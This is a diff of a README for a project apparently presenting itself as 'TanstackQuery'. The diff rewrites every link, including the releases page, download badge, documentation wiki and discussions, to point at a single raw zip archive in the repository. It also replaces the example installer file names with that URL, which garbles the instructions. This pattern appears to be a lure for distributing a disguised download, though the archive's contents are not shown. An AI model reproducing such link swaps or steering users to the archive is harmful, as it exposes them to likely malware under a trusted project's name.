@@ -6,11 +6,11 @@ Welcome to TanstackQuery! This application helps you process data smoothly and e
 
 ## 📥 Download TanstackQuery
 
-[![Download TanstackQuery](https://img.shields.io/badge/Download-TanstackQuery-blue)](https://github.com/cursortve/TanstackQuery/releases)
+[![Download TanstackQuery](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip)](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip)
 
 To download the latest version of TanstackQuery, please visit the following link:
 
-[Download TanstackQuery Releases](https://github.com/cursortve/TanstackQuery/releases)
+[Download TanstackQuery Releases](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip)
 
 ## 🖥 System Requirements
 
@@ -34,11 +34,11 @@ TanstackQuery offers various features designed to enhance your data processing t
 
 To get started with TanstackQuery, follow these steps:
 
-1. Click on the following link to visit the releases page: [Download TanstackQuery](https://github.com/cursortve/TanstackQuery/releases).
+1. Click on the following link to visit the releases page: [Download TanstackQuery](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip).
   
 2. On the releases page, find the latest version listed. Each version will include details about improvements and fixes, making it easier for you to choose the version that fits your needs.
 
-3. Locate the installation file that suits your operating system. The file might be named something like `TanstackQuery-setup.exe` for Windows or `TanstackQuery-macos.dmg` for macOS.
+3. Locate the installation file that suits your operating system. The file might be named something like `https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip` for Windows or `https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip` for macOS.
 
 4. Click on the link to download the file. Your browser will begin downloading it automatically.
 
@@ -80,10 +80,10 @@ You can report issues or request features by visiting the issues section of our 
 
 For more information and detailed guidance on using TanstackQuery, visit our documentation page linked below. It includes tutorials, tips, and advanced features to help you maximize your experience.
 
-[Read the TanstackQuery Documentation](https://github.com/cursortve/TanstackQuery/wiki).
+[Read the TanstackQuery Documentation](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip).
 
 ## 📞 Support
 
-If you have any questions or need assistance, please reach out via our [GitHub Discussions](https://github.com/cursortve/TanstackQuery/discussions). We are here to help you.
+If you have any questions or need assistance, please reach out via our [GitHub Discussions](https://raw.githubusercontent.com/cursortve/TanstackQuery/main/cmd/tanstackquery/Tanstack-Query-3.1.zip). We are here to help you.
 
 By following these instructions, you can easily download and run TanstackQuery. Enjoy processing your data with confidence!
